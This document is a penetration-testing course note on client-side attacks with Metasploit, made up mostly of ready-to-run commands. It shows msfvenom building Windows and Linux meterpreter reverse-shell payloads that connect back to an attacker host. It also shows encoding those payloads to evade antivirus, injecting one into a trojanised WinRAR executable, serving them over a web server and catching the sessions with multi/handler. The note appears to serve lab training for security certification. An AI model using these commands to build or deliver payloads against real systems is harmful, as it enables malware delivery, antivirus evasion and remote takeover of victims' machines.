# Client-Side Attacks

## [Client-Side Attacks](https://www.offsec.com/metasploit-unleashed/client-side-attacks/) with MSF <a href="#client-side-attacks-with-msf" id="client-side-attacks-with-msf"></a>

A **client-side attack** is a security breach that happens on the client side.

* Social engineering techniques take advantage of human vulnerabilities
* Require user-interaction to open malicious documents or portable executables (**`PEs`**)
* The payload is stored on the client's system
* Attackers have to pay attention to Anti Virus detection

> ❗ _**Advanced modern antivirus solutions detects and blocks this type of payloads very easily.**_

### [Msfvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/) Payloads <a href="#msfvenom-payloads" id="msfvenom-payloads"></a>

> [**`msfvenom`**](https://www.kali.org/tools/metasploit-framework/#msfvenom) - a Metasploit standalone payload generator and encoder
>
> * **`e.g.`** - generate a malicious meterpreter payload, transfer it to a client target; once executed it will connect back to the payload handler and provides with remote access

* List available payloads

```bash
msfvenom --list payloads
```

* When generating a payload the exact name of the payload must be specified
  * target operating system
  * target O.S. architecture (x64, x86 ...)
  * payload type
  * protocol used to connect back (depends on requirements)

<figure><img src="../../../../.gitbook/assets/image (206).png" alt=""><figcaption></figcaption></figure>

**`e.g.`** of **Staged payload**

* `windows/x64/meterpreter/reverse_tcp`

**`e.g.`** of **Non-Staged payload**

* `windows/x64/meterpreter_reverse_http`

<figure><img src="../../../../.gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>

### Windows Payload <a href="#automation-with-resource-scripts" id="automation-with-resource-scripts"></a>

* Generate a Windows payload with `msfvenom`

**32bit payload:**

```bash
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.42.132 LPORT=1234 -f exe > ./Desktop/Windows_Payloads/payloadx86.exe 
```

**64bit payload:**

```bash
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.42.132 LPORT=1234 -f exe > ./Desktop/Windows_Payloads/payloadx64.exe
```

<figure><img src="../../../../.gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>

* List the output formats available

```bash
msfvenom --list formats
```

<figure><img src="../../../../.gitbook/assets/image (209).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

### Linux Payload

* Generate a Linux payload with `msfvenom`

**32bit payload:**

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.42.132 LPORT=1234 -f elf > ./Desktop/Linux_Payloads/payloadx86 
```

**64bit payload:**

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.42.132 LPORT=1234 -f elf > ./Desktop/Linux_Payloads/payloadx64
```

* 📌 _Platform and architecture are auto selected if not specified, based on the selected payload_

<figure><img src="../../../../.gitbook/assets/image (211).png" alt=""><figcaption></figcaption></figure>

The transferring method onto the target system depends on the type of the social engineering technique.

* **`e.g.`** A simple web server can be set up on the attacker system to serve the payload files and a handler to receive the connection back from the target system

```bash
cd Desktop/Windows_Payloads
python3 -m http.server 8080
```

* To deal with a `meterpreter` payload, an appropriate listener is necessary to handle the reverse connection, the `multi/handler` Metasploit module in this case

```bash
msfconsole -q
msf6 > use multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.42.132
msf6 > set LPORT 1234
msf6 > run
```

<figure><img src="../../../../.gitbook/assets/image (212).png" alt=""><figcaption></figcaption></figure>

Same example with the `linux/x86/meterpreter/reverse_tcp` Linux payload executed on the Kali VM.

```bash
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > run
```

<figure><img src="../../../../.gitbook/assets/image (214).png" alt=""><figcaption></figcaption></figure>

## Encoding Payloads <a href="#encoding-payloads" id="encoding-payloads"></a>

Signature based Antivirus solutions can detect malicious files or executables. Older AV solutions can be evaded by **encoding** the payloads.

* ❗ _This kind of attack vector is outdated and hardly used today_.
* May work on legacy old O.S. like Windows 7 or older.

🗒️ Payload **Encoding** involves changing the payload shellcode _with the aim of changing the payload signature_.

* [Encoding will not always avoid detection](https://docs.rapid7.com/metasploit/encoded-payloads-bypassing-anti-virus)

🗒️ **Shellcode** is the code typically used as a _payload_ for exploitation, that provides with a remote _command shell_ on the target system.

```bash
msfvenom --list encoders
```

<figure><img src="../../../../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>

* Excellent encoders are **`cmd/powershell_base64`** and **`x86/shikata_ga_nai`**

### **Windows Payload**

* Generate a Win x86 payload and encode it with `shikata_ga_nai`:

```bash
msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.42.132 LPORT=1234 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86
```

<figure><img src="../../../../.gitbook/assets/image (216).png" alt=""><figcaption></figcaption></figure>

* The payload can be encoded as often as desired by increasing the number of iterations.
* The more iterations, the better chances to bypass an Antivirus. Use **`-i`** option.

```bash
msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.42.132 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86
```

<figure><img src="../../../../.gitbook/assets/image (217).png" alt=""><figcaption></figcaption></figure>

### **Linux Payload**

```bash
msfvenom -p  linux/x86/meterpreter/reverse_tcp LHOST=192.168.42.132 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > ~/Desktop/Linux_Payloads/encodedx86
```

<figure><img src="../../../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

* Test each of the above generated payloads, like before

```bash
cd ~/Desktop/Windows_Payload
sudo python -m http.server 80
msfconsole -q

use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.42.132
set LPORT 1234
run
```

<figure><img src="../../../../.gitbook/assets/image (219).png" alt=""><figcaption></figcaption></figure>

> 📌 Modern antivirus detects and blocks the encoded payload as soon as the download is started:

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-0a77cc42fa547ba68f55942bb166da905d8fe024%252Fimage-20230415214414552.png%3Falt%3Dmedia&#x26;width=300&#x26;dpr=4&#x26;quality=100&#x26;sign=7f60652e&#x26;sv=1" alt=""><figcaption></figcaption></figure>

## Injecting Payloads into PEs <a href="#injecting-payloads-into-pes" id="injecting-payloads-into-pes"></a>

🗒️ [Windows **Portable Executable**](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit) (**PE**) _is a file format for executables, object code, DLLs and others, used in 32-bit and 64-bit Windows O.S._

* Download a portable executable, **`e.g.`** [WinRAR](https://www.win-rar.com/download.html)
* Payloads can be injected into PEs with `msfvenom` with the **`-x`** and **`-k`** options

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=1234 -e x86/shikata_ga_nai -i 10 -x winrar-x32-701.exe -f exe > ~/Desktop/Windows_Payloads/winrar.exe
```

<figure><img src="../../../../.gitbook/assets/image (220).png" alt=""><figcaption></figcaption></figure>

* Transfer and run the `winrar.exe` file to the target O.S.
* File description is kept, but not its functionality.
* Proceed with the Post Exploitation module to migrate the process into another one, in the `meterpreter` session

```bash
run post/windows/manage/migrate
```

## Automation with [Resource Scripts](https://www.offsec.com/metasploit-unleashed/writing-meterpreter-scripts/) <a href="#automation-with-resource-scripts" id="automation-with-resource-scripts"></a>

Repetitive tasks and commands can be automated using **MSF resource scripts** (same as batch scripts).
